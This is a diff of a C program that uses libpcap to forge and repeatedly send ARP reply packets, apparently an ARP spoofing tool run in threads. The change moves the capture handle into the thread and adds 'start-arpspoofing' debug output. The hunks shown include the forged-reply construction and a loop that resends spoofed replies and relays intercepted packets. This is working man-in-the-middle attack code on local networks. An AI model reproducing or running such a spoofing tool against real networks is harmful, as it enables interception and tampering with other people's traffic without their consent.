@@ -7,7 +7,7 @@
 #include "header.h"
 #define ETHERTYPE_ARP 0x0806
 //unsigned char packet[42];
-pcap_t * handle;
+//pcap_t * handle;
 /*void * func1(){
 	while(1){
 		pcap_sendpacket(handle,packet,sizeof(packet));
@@ -25,6 +25,7 @@ void * func(void * p_thread){
 	char * dev;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	int i=0,j=0,a=0;
+	pcap_t * handle;
 	struct ether_header * eth; 
 	struct ether_header * rcv_eth;
 	struct ether_header * rcv1_eth;
@@ -122,11 +123,15 @@ void * func(void * p_thread){
 	inet_pton(AF_INET,(const char *)t_thread->argv3,arp->ar_spa);
 	arp->op = htons(0x02);
 	pcap_sendpacket(handle,packet,sizeof(packet));
+	printf("start-arpspoofing..\n");
+	printf("%s\n",t_thread->argv2);
 	//thr_id = pthread_create(&thread[0],NULL,func1,(void *)p_thread);
-
 	while(1){
 		i = pcap_next_ex(handle,&header,&rcv1_packet);
 		if(i==1){
+		/*for(j=0;j<50;j++){
+			printf("%02x ",rcv1_packet[j]);
+		}*/
 			rcv1_eth = (struct ether_header *)rcv1_packet;
 			pcap_sendpacket(handle,packet,sizeof(packet));
 			if(memcmp(arp->ar_tha,rcv1_eth->ether_shost,6)==0){
@@ -136,6 +141,7 @@ void * func(void * p_thread){
 					printf("%s\n",pcap_geterr(handle));
 					continue;
 				}
+				printf("%s ==> %s\n",t_thread->argv2,t_thread->argv3);
 			}			
 		}
 	}
